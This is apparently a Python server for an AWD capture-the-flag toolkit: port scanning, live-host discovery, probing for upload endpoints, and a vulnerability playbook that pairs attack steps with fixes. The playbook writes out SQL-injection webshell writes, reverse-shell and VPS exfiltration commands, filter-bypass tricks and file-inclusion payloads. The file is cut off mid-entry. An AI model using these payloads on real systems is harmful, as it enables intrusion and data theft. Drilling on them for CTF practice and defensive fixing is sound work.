#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""LingOps 扩展服务：端口扫描 + 上传点探测

纯 Python 标准库实现，无第三方依赖。
默认监听 127.0.0.1:12801，供 LingOps 前端扩展面板（/assets_v2/lp-ext/panel.html）调用。

用法:
    python3 lp_scan_server.py --port 12801
    python3 lp_scan_server.py --scan 127.0.0.1 -p common --upload
"""

from __future__ import annotations

import argparse
import base64
import csv
import datetime
import errno
import hashlib
import html
import http.client
import io
import ipaddress
import json
import os
import re
import selectors
import shutil
import socket
import ssl
import subprocess
import sys
import threading
import time
import traceback
import uuid
import zipfile
from concurrent.futures import ThreadPoolExecutor, as_completed
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlsplit, urljoin, quote, unquote

UA = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
VERSION = "1.0.0"
MAX_TARGETS = 1024
MAX_BODY = 262144

# ---------------------------------------------------------------- 端口预设

PRESETS = {
    "web": "80,81,88,443,3000,5000,7001,7002,8000,8001,8008,8080,8081,8082,8088,"
           "8090,8181,8443,8888,9000,9001,9090,9200,10000,12800,18080,28080",
    "common": "21,22,23,25,53,80,110,111,135,139,143,443,445,873,993,995,1080,1433,"
              "1521,1723,2049,2181,2375,2376,3000,3306,3389,4440,5000,5432,5601,5672,"
              "5900,6379,7001,8000,8009,8080,8081,8088,8443,8888,9000,9001,9090,9200,"
              "9300,10000,11211,12800,27017",
    "top100": "7,9,13,21,22,23,25,37,53,79,80,81,88,106,110,111,113,119,135,139,143,"
              "144,179,199,389,427,443,444,445,465,500,512,513,514,515,548,554,587,631,"
              "636,646,873,990,993,995,1025,1026,1027,1028,1029,1110,1433,1720,1723,1755,"
              "1900,2000,2001,2049,2121,2222,2375,3000,3128,3306,3389,3986,4899,5000,5009,"
              "5051,5060,5101,5190,5357,5432,5631,5666,5800,5900,6000,6001,6379,6646,7070,"
              "8000,8008,8009,8080,8081,8443,8888,9100,9200,9999,10000,11211,27017,32768,"
              "49152,49153,49154,49155,49156",
    "all": "1-65535",
}

TLS_PORTS = {443, 465, 636, 993, 995, 4443, 8443, 9443, 10443}

WEB_PORTS = {
    80, 81, 88, 3000, 5000, 7001, 7002, 8000, 8001, 8008, 8009, 8080, 8081, 8082,
    8088, 8090, 8181, 8443, 8888, 9000, 9001, 9090, 9200, 10000, 12800, 18080, 28080,
}

SERVICE_BY_PORT = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP", 110: "POP3",
    111: "rpcbind", 135: "MSRPC", 139: "NetBIOS", 143: "IMAP", 389: "LDAP", 443: "HTTPS",
    445: "SMB", 465: "SMTPS", 873: "rsync", 993: "IMAPS", 995: "POP3S", 1080: "SOCKS",
    1433: "MSSQL", 1521: "Oracle", 1723: "PPTP", 2049: "NFS", 2181: "ZooKeeper",
    2375: "Docker", 2376: "Docker(TLS)", 3000: "HTTP", 3306: "MySQL", 3389: "RDP",
    4440: "Rundeck", 5000: "HTTP", 5432: "PostgreSQL", 5601: "Kibana", 5672: "RabbitMQ",
    5900: "VNC", 6379: "Redis", 7001: "WebLogic", 8000: "HTTP", 8009: "AJP", 8080: "HTTP",
    8081: "HTTP", 8088: "HTTP", 8443: "HTTPS", 8888: "HTTP", 9000: "HTTP", 9001: "HTTP",
    9090: "HTTP", 9200: "Elasticsearch", 9300: "Elasticsearch", 10000: "HTTP",
    11211: "Memcached", 12800: "LingOps", 27017: "MongoDB",
}

BANNER_RULES = [
    (r"^SSH-([\d.]+)-(\S+)", lambda m: "SSH (%s)" % m.group(2)),
    (r"^220[ -].*FTP", lambda m: "FTP"),
    (r"^220[ -].*SMTP", lambda m: "SMTP"),
    (r"^\+OK", lambda m: "POP3"),
    (r"^\* OK", lambda m: "IMAP"),
    (r"^HTTP/1\.[01] \d{3}", lambda m: "HTTP"),
    (r"^RFB \d{3}", lambda m: "VNC"),
    (r"mysql_native_password|^[\x00-\x1f]?[\d.]+\x00", lambda m: "MySQL"),
    (r"^-ERR|^\$?\d+\r?\n?$|^\+PONG", lambda m: "Redis"),
    (r"AMQP", lambda m: "RabbitMQ"),
    (r"^SSH", lambda m: "SSH"),
    (r"MongoDB|ismaster", lambda m: "MongoDB"),
    (r"^\x16\x03", lambda m: "TLS"),
]

KNOWN_NON_WEB = {21, 22, 23, 25, 53, 110, 111, 135, 139, 143, 389, 445, 465, 587, 636,
                 873, 993, 995, 1433, 1521, 1723, 2049, 2181, 3306, 3389, 5432, 5672, 5900,
                 6379, 11211, 27017}

PROBE_PAYLOADS = {
    6379: b"PING\r\n",
    11211: b"version\r\n",
    21: None, 22: None, 25: None, 110: None, 143: None, 3306: None, 5900: None,
}

# ---------------------------------------------------------------- 上传点特征

UPLOAD_KEYWORDS = [
    (r'type\s*=\s*["\']?file', "file 输入框"),
    (r"multipart/form-data", "multipart 表单"),
    (r"webuploader", "WebUploader"),
    (r"ueditor", "UEditor"),
    (r"kindeditor", "KindEditor"),
    (r"fckeditor|ckeditor", "CKEditor"),
    (r"ewebeditor", "eWebEditor"),
    (r"ckfinder", "CKFinder"),
    (r"el-upload", "Element Upload"),
    (r"layui\.upload|upload\.render", "Layui Upload"),
    (r"wangeditor", "wangEditor"),
    (r"dropzone", "Dropzone"),
    (r"plupload", "Plupload"),
    (r"swfupload", "SWFUpload"),
    (r"上传", "“上传”字样"),
    (r"upload", "upload 关键字"),
]

UPLOAD_PATHS = [
    "/upload", "/upload/", "/uploads/", "/upload.php", "/upload.html", "/upload.jsp",
    "/upload.aspx", "/upload.do", "/uploadfile", "/uploadFile", "/upfile", "/up.php",
    "/file/upload", "/fileUpload", "/api/upload", "/api/file/upload", "/api/v1/upload",
    "/api/upload/file", "/admin/upload", "/admin/upload.php", "/manage/upload",
    "/system/upload", "/common/upload", "/index.php?m=Upload&a=index", "/uploadify.php",
    "/uploadimg", "/uploadImg", "/editor/upload", "/attachment/upload", "/attach/upload",
    "/user/upload", "/member/upload", "/cms/upload", "/ueditor/php/controller.php?action=config",
    "/ueditor/jsp/controller.jsp?action=config", "/kindeditor/php/upload_json.php",
    "/kindeditor/jsp/upload_json.jsp", "/fckeditor/editor/filemanager/connectors/php/connector.php",
    "/ckfinder/ckfinder.html", "/ewebeditor/admin/default.aspx", "/static/upload/",
    "/public/upload/", "/data/upload/", "/runtime/upload/",
]

UPLOAD_DIRS = ["/uploads/", "/upload/", "/files/", "/static/upload/", "/public/upload/",
               "/data/upload/", "/attachment/", "/attachments/"]

FIELD_NAMES = ["file", "upload", "fileupload", "upfile", "img", "image", "photo",
               "Filedata", "editormd-image-file", "files[]"]

SUCCESS_WORDS = ["上传成功", "上传文件成功", "文件上传成功", "success", "\"code\":0",
                 "\"code\": 0", "\"status\":1", "\"status\": 1", "\"ok\":true", "ok"]
FAIL_WORDS = ["不允许", "禁止", "失败", "错误", "error", "not allowed", "invalid",
              "forbidden", "denied", "文件类型", "too large", "过大"]

MARKER = "LINGOPS_PROBE_"


# ---------------------------------------------------------------- 工具函数

def now_ts() -> str:
    return time.strftime("%H:%M:%S")


def log_line(msg: str) -> str:
    return "[%s] %s" % (now_ts(), msg)


def parse_ports(text: str) -> list[int]:
    ports: set[int] = set()
    text = (text or "").strip()
    if not text:
        text = "common"
    for token in re.split(r"[\s,;，；]+", text):
        if not token:
            continue
        low = token.lower()
        if low in PRESETS:
            ports.update(parse_ports(PRESETS[low]))
            continue
        m = re.fullmatch(r"(\d{1,5})\s*-\s*(\d{1,5})", token)
        if m:
            a, b = int(m.group(1)), int(m.group(2))
            if a > b:
                a, b = b, a
            ports.update(p for p in range(a, b + 1) if 1 <= p <= 65535)
            continue
        if token.isdigit():
            p = int(token)
            if 1 <= p <= 65535:
                ports.add(p)
    return sorted(ports)


def _ip_to_int(ip: str) -> int:
    parts = [int(x) for x in ip.split(".")]
    return (parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]


def _int_to_ip(v: int) -> str:
    return "%d.%d.%d.%d" % ((v >> 24) & 255, (v >> 16) & 255, (v >> 8) & 255, v & 255)


def parse_targets(text: str) -> tuple[list[str], list[int]]:
    """支持 IP / CIDR / 1.2.3.1-20 / 1.2.3.1-1.2.3.20 / 域名 / http://host:port"""
    targets: list[str] = []
    extra_ports: list[int] = []
    seen: set[str] = set()

    for raw in re.split(r"[\s,;，；]+", text or ""):
        raw = raw.strip()
        if not raw:
            continue
        if "://" in raw:
            u = urlsplit(raw)
            if u.port:
                extra_ports.append(u.port)
            raw = u.hostname or ""
            if not raw:
                continue
        if raw.startswith("-"):
            continue

        hosts: list[str] = []
        if "/" in raw:
            try:
                net = ipaddress.ip_network(raw, strict=False)
                if net.num_addresses > MAX_TARGETS + 2:
                    raise ValueError("网段过大")
                hosts = [str(h) for h in net.hosts()][:MAX_TARGETS]
            except Exception:
                continue
        elif re.fullmatch(r"\d{1,3}(\.\d{1,3}){3}-\d{1,3}", raw):
            base, last = raw.split("-")
            a = _ip_to_int(base) & 0xFFFFFF00
            for i in range(1, int(last) + 1):
                hosts.append(_int_to_ip(a + i))
        elif re.fullmatch(r"\d{1,3}(\.\d{1,3}){3}-\d{1,3}(\.\d{1,3}){3}", raw):
            a, b = raw.split("-")
            start, end = _ip_to_int(a), _ip_to_int(b)
            if end < start:
                start, end = end, start
            if end - start > MAX_TARGETS:
                continue
            hosts = [_int_to_ip(v) for v in range(start, end + 1)]
        elif re.fullmatch(r"\d{1,3}(\.\d{1,3}){3}", raw):
            hosts = [raw]
        else:
            try:
                hosts = [socket.gethostbyname(raw)]
            except Exception:
                continue

        for h in hosts:
            if h not in seen:
                seen.add(h)
                targets.append(h)
            if len(targets) >= MAX_TARGETS:
                return targets, extra_ports
    return targets, extra_ports


def clean_text(data: bytes, limit: int = 200) -> str:
    try:
        text = data.decode("utf-8", "replace")
    except Exception:
        text = data.decode("latin-1", "replace")
    text = re.sub(r"[^\x20-\x7e\u4e00-\u9fff]+", " ", text)
    return re.sub(r"\s+", " ", text).strip()[:limit]


def guess_service(port: int, banner: str) -> str:
    for pattern, fn in BANNER_RULES:
        m = re.search(pattern, banner or "", re.I)
        if m:
            try:
                return fn(m)
            except Exception:
                pass
    return SERVICE_BY_PORT.get(port, "unknown")


# ---------------------------------------------------------------- TCP 扫描

def tcp_scan(ip: str, port: int, timeout: float = 1.0) -> dict | None:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    t0 = time.time()
    try:
        s.connect((ip, port))
    except Exception:
        try:
            s.close()
        except Exception:
            pass
        return None

    rtt = int((time.time() - t0) * 1000)
    banner = ""
    try:
        s.settimeout(min(1.2, max(0.3, timeout)))
        try:
            banner = clean_text(s.recv(1024))
        except Exception:
            banner = ""
        if not banner and port in PROBE_PAYLOADS:
            payload = PROBE_PAYLOADS[port]
            if payload:
                s.sendall(payload)
                banner = clean_text(s.recv(2048))
        if not banner and port not in WEB_PORTS:
            try:
                s.sendall(b"\r\n")
                banner = clean_text(s.recv(1024))
            except Exception:
                pass
    except Exception:
        pass
    finally:
        try:
            s.close()
        except Exception:
            pass

    return {"port": port, "state": "open", "rtt": rtt, "banner": banner,
            "service": guess_service(port, banner)}


# ---------------------------------------------------------------- 存活探测
#
# LingOps 官方「侦察 → 探测」只用 ICMP echo，丢弃 ICMP 的主机（防火墙 DROP、
# 云主机安全组、NAT 只映射 80）会被误判为离线。这里做 ICMP + TCP 双探：
#   1. 先发 1 个 ICMP echo；
#   2. 不通则对常见端口做 TCP connect：连上(open) 或收到 RST(refused) 都算在线。

DISCOVER_PORTS = [80, 443, 8080, 8443, 8000, 22, 445, 3389, 21, 23, 25, 110, 143,
                  3306, 5432, 6379, 9200, 5000, 7001, 8081, 8888, 9090, 11211, 27017]
DISCOVER_MAX_HOSTS = 1024
# Windows 的 selectors.DefaultSelector 是 SelectSelector，受 FD_SETSIZE(512) 限制，
# 每个探活线程最多挂 len(DISCOVER_PORTS) 个 socket，必须压低线程数否则直接抛
# "too many file descriptors in select()"。
_IS_WIN = sys.platform == "win32"
DISCOVER_WORKERS = 12 if _IS_WIN else 96
# ECONNREFUSED：对端回了 RST，说明主机活着
_REFUSED = {errno.ECONNREFUSED, 61, 111}
_INPROGRESS = {errno.EINPROGRESS, errno.EWOULDBLOCK, errno.EALREADY, 36, 115, 114}


def icmp_ping(ip: str, timeout: float = 1.0) -> int | None:
    """系统 ping 发 1 个 ICMP echo，返回 rtt(ms)；不通返回 None。"""
    ms = str(max(50, int(timeout * 1000)))
    if _IS_WIN:
        # Windows：-n 次数 / -w 超时(毫秒)；中文系统输出「时间=1ms」「时间<1ms」
        cmd = ["ping", "-n", "1", "-w", ms, ip]
    elif sys.platform == "darwin":
        cmd = ["ping", "-c", "1", "-n", "-W", ms,
               "-t", str(max(1, int(timeout + 0.5))), ip]
    else:
        cmd = ["ping", "-c", "1", "-n", "-W", str(max(1, int(round(timeout)))), ip]
    try:
        # 不指定 encoding：Windows 中文系统输出是 GBK，交给 locale 解码
        out = subprocess.run(cmd, capture_output=True, text=True,
                             timeout=timeout + 2.5).stdout or ""
    except Exception:
        return None
    m = re.search(r"(?:time|时间)[=<]\s*([\d.]+)\s*ms", out, re.I)
    if m:
        return max(1, int(float(m.group(1))))
    # Windows 上 rtt 可能因编码取不到，用 TTL 判定存活即可
    if re.search(r"TTL[=＝]\s*\d+", out, re.I):
        return 1
    if " 0.0% packet loss" in out or " 0% packet loss" in out:
        return 0
    if "0% 丢失" in out or "0% loss" in out.lower():
        return 0
    return None


def tcp_probe(ip: str, ports: list[int], timeout: float = 1.0) -> dict | None:
    """TCP 兜底探活：端口全并发 connect，open 或 refused(RST) 都判定在线。"""
    sel = selectors.DefaultSelector()
    pending: dict = {}
    try:
        for port in ports:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(False)
            t0 = time.time()
            try:
                rc = s.connect_ex((ip, port))
            except Exception:
                rc = -1
            if rc == 0:
                s.close()
                return {"port": port, "rtt": int((time.time() - t0) * 1000),
                        "method": "tcp-open"}
            if rc in _REFUSED:
                s.close()
                return {"port": None, "rtt": None, "method": "tcp-refused"}
            if rc in _INPROGRESS:
                try:
                    sel.register(s, selectors.EVENT_WRITE, port)
                    pending[s] = t0
                    continue
                except Exception:
                    pass
            s.close()

        deadline = time.time() + timeout
        while pending:
            remain = deadline - time.time()
            if remain <= 0:
                break
            events = sel.select(remain)
            if not events:
                break
            for key, _ in events:
                s = key.fileobj
                port = key.data
                t0 = pending.pop(s, time.time())
                try:
                    sel.unregister(s)
                except Exception:
                    pass
                try:
                    rc = s.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
                except Exception:
                    rc = -1
                try:
                    s.close()
                except Exception:
                    pass
                if rc == 0:
                    return {"port": port, "rtt": int((time.time() - t0) * 1000),
                            "method": "tcp-open"}
                if rc in _REFUSED:
                    return {"port": None, "rtt": None, "method": "tcp-refused"}
        return None
    finally:
        for s in list(pending):
            try:
                sel.unregister(s)
            except Exception:
                pass
            try:
                s.close()
            except Exception:
                pass
        try:
            sel.close()
        except Exception:
            pass


def discover_one(ip: str, timeout: float, ports: list[int], use_icmp: bool = True) -> dict:
    if use_icmp:
        ms = icmp_ping(ip, timeout)
        if ms is not None:
            return {"ip": ip, "alive": True, "method": "icmp", "rtt": ms, "port": None}
    hit = tcp_probe(ip, ports, timeout)
    if hit:
        return {"ip": ip, "alive": True, "method": hit["method"],
                "rtt": hit.get("rtt"), "port": hit.get("port")}
    return {"ip": ip, "alive": False, "method": None, "rtt": None, "port": None}


def discover_hosts(targets: str, timeout: float = 1.0, ports: list[int] | None = None,
                   use_icmp: bool = True) -> dict:
    hosts, extra_ports = parse_targets(targets)
    if not hosts:
        raise ValueError("没有解析出有效目标，支持 192.168.1.0/24 / 1.2.3.1-20 / 单个 IP")
    ports = list(dict.fromkeys((ports or []) + extra_ports + DISCOVER_PORTS))
    hosts = hosts[:DISCOVER_MAX_HOSTS]

    t0 = time.time()
    results: list[dict] = []
    with ThreadPoolExecutor(max_workers=min(DISCOVER_WORKERS, len(hosts))) as pool:
        futures = {pool.submit(discover_one, ip, timeout, ports, use_icmp): ip for ip in hosts}
        for fut in as_completed(futures):
            try:
                results.append(fut.result())
            except Exception:
                results.append({"ip": futures[fut], "alive": False, "method": None,
                                "rtt": None, "port": None})
    order = {ip: i for i, ip in enumerate(hosts)}
    results.sort(key=lambda r: order.get(r["ip"], 0))

    alive = [r for r in results if r["alive"]]
    return {
        "hosts": results,
        "stats": {
            "total": len(results),
            "alive": len(alive),
            "by_icmp": sum(1 for r in alive if r["method"] == "icmp"),
            "by_tcp": sum(1 for r in alive if str(r["method"]).startswith("tcp")),
            "elapsed_ms": int((time.time() - t0) * 1000),
            "ports": ports,
            "timeout": timeout,
        },
    }


# ---------------------------------------------------------------- AI 修复包
#
# 把一次 Break/Fix 上传的源码 + 扫描结果落盘，并起一个只读的本地 HTTP 站点：
#   http://127.0.0.1:12801/awdp/<id>/          ← 目录页（人看）
#   http://127.0.0.1:12801/awdp/<id>/bundle.md ← 全文（在线 AI 上传/粘贴）
#   http://127.0.0.1:12801/awdp/<id>/prompt.txt← 现成的修复提示词
#   http://127.0.0.1:12801/awdp/<id>/raw?p=src/xxx.php ← 单文件原文（AI 逐个读）
# 同时返回磁盘绝对路径，本地 AI（Cursor / Claude Desktop / Copilot）可直接读目录。

AWDP_MAX_FILES = 4000
AWDP_MAX_FILE_BYTES = 512 * 1024
AWDP_MAX_BODY = 64 * 1024 * 1024
AWDP_ALLOW_EXT = {
    ".php", ".php3", ".php4", ".php5", ".phtml", ".inc", ".java", ".jsp", ".jspx",
    ".go", ".py", ".rb", ".js", ".ts", ".mjs", ".cjs", ".jsx", ".tsx", ".aspx",
    ".asp", ".cs", ".sh", ".pl", ".lua", ".html", ".htm", ".twig", ".tpl", ".xml",
    ".yml", ".yaml", ".json", ".ini", ".conf", ".env", ".sql", ".md", ".txt",
}
AWDP_SKIP_DIR = re.compile(
    r"(^|/)(node_modules|vendor|\.git|__MACOSX|dist|build|target|\.idea|\.vscode|"
    r"bower_components|\.venv|venv|__pycache__)(/|$)", re.I)
AWDP_GENERATED = ("index.html", "bundle.md", "bundle.txt", "prompt.txt",
                  "attack-plan.md", "fix-plan.md", "local-ai.md",
                  "make_patch.py", "extract_files.py", "check_fixed.py",
                  "findings.json", "tree.txt", "README.md")
AWDP_TOOLS = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tools")
AWDP_MAKE_PATCH = os.path.join(AWDP_TOOLS, "make_patch.py")
AWDP_EXTRACT = os.path.join(AWDP_TOOLS, "extract_files.py")
AWDP_TOOL_FILES = ("make_patch.py", "extract_files.py", "check_fixed.py")


def awdp_root() -> str:
    root = os.environ.get("LP_AWDP_DIR") or os.path.join(os.path.expanduser("~"), "LingOps-AWDP")
    os.makedirs(root, exist_ok=True)
    return root


def _safe_rel(path: str) -> str | None:
    p = (path or "").replace("\\", "/").strip()
    p = re.sub(r"^\./+", "", p)
    if not p or p.startswith("/") or re.match(r"^[A-Za-z]:", p):
        return None
    parts = [x for x in p.split("/") if x not in ("", ".")]
    if any(x == ".." for x in parts):
        return None
    rel = "/".join(parts)
    if len(rel) > 400:
        return None
    return rel


def _slug(text: str, limit: int = 40) -> str:
    s = re.sub(r"[^\w\-.\u4e00-\u9fff]+", "-", (text or "awdp")).strip("-.")
    return (s or "awdp")[:limit]


def _ext_ok(path: str) -> bool:
    return os.path.splitext(path)[1].lower() in AWDP_ALLOW_EXT


def awdp_new_id(name: str) -> str:
    stamp = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
    return "%s-%s" % (stamp, _slug(name))


def awdp_session_dir(sid: str) -> str | None:
    if not re.fullmatch(r"[\w\-.\u4e00-\u9fff]{1,120}", sid or ""):
        return None
    d = os.path.join(awdp_root(), sid)
    return d if os.path.isdir(d) else None


def _awdp_collect(params: dict) -> tuple[list[tuple[str, bytes]], int]:
    """从 zip(base64) 或 files[] 收集源码，返回 [(rel, bytes)]。"""
    out: list[tuple[str, bytes]] = []
    skipped = 0
    seen = set()

    zip_b64 = params.get("zip")
    if zip_b64:
        raw = base64.b64decode(re.sub(r"^data:[^,]*,", "", zip_b64))
        zf = zipfile.ZipFile(io.BytesIO(raw))
        for info in zf.infolist():
            if info.is_dir():
                continue
            rel = _safe_rel(info.filename)
            if not rel or rel in seen:
                skipped += 1
                continue
            if AWDP_SKIP_DIR.search(rel) or not _ext_ok(rel):
                skipped += 1
                continue
            if info.file_size > AWDP_MAX_FILE_BYTES:
                skipped += 1
                continue
            try:
                data = zf.read(info)
            except Exception:
                skipped += 1
                continue
            if b"\x00" in data[:4096]:
                skipped += 1
                continue
            seen.add(rel)
            out.append((rel, data))
            if len(out) >= AWDP_MAX_FILES:
                break
        return out, skipped

    for item in params.get("files") or []:
        if not isinstance(item, dict):
            continue
        rel = _safe_rel(item.get("path"))
        if not rel or rel in seen or AWDP_SKIP_DIR.search(rel):
            skipped += 1
            continue
        text = item.get("text")
        if not isinstance(text, str):
            continue
        data = text.encode("utf-8", "replace")
        if len(data) > AWDP_MAX_FILE_BYTES:
            skipped += 1
            continue
        seen.add(rel)
        out.append((rel, data))
        if len(out) >= AWDP_MAX_FILES:
            break
    return out, skipped


def _norm_finding(f: dict) -> dict:
    sev = str(f.get("sev") or f.get("severity") or "medium").lower()
    if sev in ("critical", "严重"):
        sev = "critical"
    elif sev in ("high", "高危"):
        sev = "high"
    elif sev in ("medium", "中危"):
        sev = "medium"
    elif sev in ("low", "低危", "info", "提示"):
        sev = "low"
    else:
        sev = "medium"
    return {
        "sev": sev,
        "cat": str(f.get("cat") or f.get("category") or f.get("rule_id") or "other"),
        "name": str(f.get("name") or f.get("message") or f.get("title") or "疑似漏洞"),
        "file": str(f.get("file") or f.get("file_path") or "?"),
        "line": int(f.get("line") or f.get("line_no") or 0),
        "code": str(f.get("code") or f.get("snippet") or ""),
        "fix": str(f.get("fix") or f.get("suggestion") or ""),
        "source": str(f.get("source") if isinstance(f.get("source"), str) else
                      (f.get("source") or {}).get("varName", "") if isinstance(f.get("source"), dict) else ""),
        "sanitized": bool(f.get("sanitized")),
    }


# ---------------------------------------------------------------- 漏洞攻防手册
#
# 每条 finding 会按 name / cat / code 里的关键词匹配到下面某一类，
# 然后在 bundle.md、index.html、attack-plan.md、fix-plan.md 里展开
# 「攻击思路」和「修复思路」。关键词按命中数量打分，取最高分的类别。

VULN_PLAYBOOK: list[dict] = [
    {
        "key": "sqli", "label": "SQL 注入",
        "kw": ["sql", "sqli", "注入", "union", "select ", "mysql_query", "mysqli_query",
               "query(", "execute(", "prepare(", "order by", "where "],
        "attack": [
            "先定注入类型：数字型直接 `and 1=1` / `and 1=2` 看回显差异；字符型先闭合引号，"
            "`' and '1'='1` 与 `' and '1'='2` 对比。",
            "确定列数：`order by N` 递增直到报错；再用 `union select 1,2,3-- -` 找回显位。",
            "回显位可用就直接读数据：`union select 1,database(),user(),version()-- -`，"
            "再 `union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()-- -`。",
            "无回显就盲注：布尔盲注 `and substr((select flag from flag),1,1)='f'`；"
            "时间盲注 `and if(substr(...)='f',sleep(2),0)`（MySQL）/ `pg_sleep(2)`（PG）。",
            "有写权限时直接拿 shell：`union select 1,'<?php eval($_POST[1]);?>',3 into outfile '/var/www/html/x.php'-- -`，"
            "或用 `load_file('/flag')` / `load_file('/etc/passwd')` 直接读文件。",
            "AWD 里 flag 常在 `flag` 表、`/flag`、`/flag.txt`，先试 `select * from flag` 和 `load_file('/flag')`。",
        ],
        "fix": [
            "根因是**把用户输入拼进 SQL**，不是「过滤不够」——先定位拼接点："
            "`$sql = \"... where id=$id\"` / `\"... like '%$kw%'\"`。",
            "首选改成预处理语句（PDO）：`$st=$pdo->prepare('select * from t where id=?'); $st->execute([$id]);`；"
            "mysqli：`$st=$db->prepare('... where id=?'); $st->bind_param('i',$id); $st->execute();`。",
            "无法改结构时，强制类型转换是最小改动：`$id=intval($_GET['id']);`（数字）、"
            "字符串用 `$db->real_escape_string($s)` 并**给整条 SQL 的字符串加引号**（漏引号等于没过滤）。",
            "`order by` / `limit` / 表名这类不能参数化的位置，必须**白名单**："
            "`$col = in_array($c,['id','name','time'])?$c:'id';`。",
            "关掉报错回显（`display_errors=Off`），否则 `order by` 报错直接泄露库名表名。",
            "**别改坏功能**：注意原有 `%$kw%` 模糊查询要保留 `%`，参数化时把 `%` 拼在参数值里而不是 SQL 里。",
        ],
    },
    {
        "key": "rce", "label": "命令执行（RCE）",
        "kw": ["system(", "exec(", "shell_exec", "passthru", "popen", "proc_open",
               "反引号", "command", "命令执行", "rce", "runtime.getruntime", "processbuilder"],
        "attack": [
            "先确认回显：`;id` / `|id` / `&&id` / `` `id` `` / `$(id)` 五种分隔符挨个试，"
            "过滤了分号不代表过滤了管道和换行（`%0a`）。",
            "无回显就外带：`curl http://你的vps/$(whoami)`，或写文件 `> /var/www/html/o.txt` 再访问，"
            "或 `ping -c1 你的域名` 用 DNS 日志确认。",
            "过滤了空格用 `${IFS}`、`$IFS$9`、`<`、`%09`；过滤了关键字用 `c''at /flag`、`c\\at`、`$@`、"
            "base64：`echo Y2F0IC9mbGFn|base64 -d|sh`。",
            "拿 shell：`bash -i >& /dev/tcp/ip/port 0>&1`，或 `nc -e /bin/sh ip port`（老版本 nc）。",
            "直接读 flag 往往比拿 shell 快：`cat /flag /flag.txt /f* 2>/dev/null`、`find / -name 'flag*' -maxdepth 3`。",
        ],
        "fix": [
            "根因是**把可控字符串交给 shell**。能不用 shell 就不用：PHP 用 `escapeshellarg()` 包每个参数，"
            "并且**不要拼接**：`system('ping -c1 '.escapeshellarg($ip));`。",
            "更好的是换成无 shell 的实现：PHP `filter_var($ip,FILTER_VALIDATE_IP)` 后再用 socket/`exec` 传数组；"
            "Java 用 `ProcessBuilder(List<String>)` 而不是 `Runtime.exec(String)`。",
            "白名单是终极方案：只允许固定动作 `switch($act){case 'ping':...;case 'trace':...;}`，"
            "参数只接受 IP/域名正则 `^[a-zA-Z0-9.\-]+$`。",
            "禁用危险函数（`disable_functions=system,exec,shell_exec,passthru,popen,proc_open,pcntl_exec`）只能挡一层，"
            "**不能当主修复**，因为 `putenv`+`mail`、`LD_PRELOAD`、`imagemagick` 都能绕。",
            "**别改坏功能**：如果业务真的要执行命令，保留白名单里的命令，只把参数做 `escapeshellarg`，"
            "并限制超时（`timeout 5`）防止 sleep 型 DoS。",
        ],
    },
    {
        "key": "code_exec", "label": "代码执行（eval/assert/动态执行）",
        "kw": ["eval(", "assert(", "create_function", "call_user_func", "preg_replace.*/e",
               "代码执行", "dynamic", "反射", "invoke("],
        "attack": [
            "直接传 PHP 代码：`?code=phpinfo();` 或 `?code=system('id');`；"
            "若被 `<?php` 包裹，传 `?>xxx<?php` 逃出。",
            "assert 老版本（PHP<7）`assert($_POST[x])` 等价 eval；`create_function` 同理。",
            "`preg_replace` 的 `/e` 修饰符（PHP<7）可以 `preg_replace('/.*/e',$_GET[c],'')` 直接执行。",
            "`call_user_func($_GET[f],$_GET[a])` 是任意函数调用：`f=system&a=cat /flag`。",
            "无回显时写文件：`file_put_contents('/var/www/html/s.php','<?php eval($_POST[1]);?>');`。",
        ],
        "fix": [
            "**删掉 eval/assert**，这是唯一正确修复。若业务是模板/表达式，换成白名单求值器，"
            "不要用 `eval` 拼字符串。",
            "`call_user_func` 这类必须加函数白名单：`in_array($f,['trim','strtolower'])` 才允许调用。",
            "`preg_replace` 的 `/e` 改成 `preg_replace_callback`，回调里写死逻辑。",
            "检查是否被 `include` 的模板/插件文件带进来（常见：`config.php` 里 `eval(base64_decode(...))` 后门）。",
            "**别改坏功能**：表达式引擎类功能改成「变量替换 + 白名单运算」而不是直接删功能。",
        ],
    },
    {
        "key": "lfi", "label": "文件包含（LFI/RFI）",
        "kw": ["include(", "include_once", "require(", "require_once", "文件包含", "lfi", "rfi",
               "page=", "file=", "tpl=", "template"],
        "attack": [
            "先测目录穿越：`?page=../../../../etc/passwd`，再试绝对路径 `?page=/etc/passwd`。",
            "读源码：`?page=php://filter/convert.base64-encode/resource=index.php`，"
            "base64 解码拿到完整源码（比盲猜快得多）。",
            "写 shell 再包含：配合日志/会话/上传——`?page=/var/log/nginx/access.log` 且 UA 里塞 `<?php eval($_POST[1]);?>`；"
            "或 `?page=/tmp/sess_xxx`（session 内容可控）。",
            "`php://input` + POST 数据：`?page=php://input`，body 写 PHP 代码（需 `allow_url_include` 或 `data://`）。",
            "RFI：`?page=http://你的vps/shell.txt`（`allow_url_include=On` 才行）。",
            "PHP 伪协议组合：`data://text/plain;base64,PD9waHAg...`、`phar://` 触发反序列化。",
        ],
        "fix": [
            "根因是**用用户输入拼路径**。最小改动：白名单映射 "
            "`$map=['home'=>'pages/home.php','about'=>'pages/about.php']; include $map[$page] ?? 'pages/home.php';`。",
            "必须动态时，用 `basename()` 去掉目录部分 + 强制后缀：`$f=basename($page).'.php';`，"
            "并 `realpath()` 后校验前缀：`str_starts_with(realpath($f), realpath(__DIR__.'/pages/'))`。",
            "关掉 `allow_url_include=Off`、`allow_url_fopen=Off`，能挡 RFI 和大部分伪协议。",
            "`php://filter` 读源码是「包含」的副产物，白名单能一并解决；注意别只过滤 `..`（`....//` 能绕）。",
            "**别改坏功能**：多语言/多模板站点保留原有 `?lang=zh` 之类的键，只是把值映射成固定文件名。",
        ],
    },
    {
        "key": "fileread", "label": "任意文件读取/下载",
        "kw": ["file_get_contents", "readfile", "fopen(", "file(", "fpassthru", "下载", "download",
               "path=", "filename=", "任意文件"],
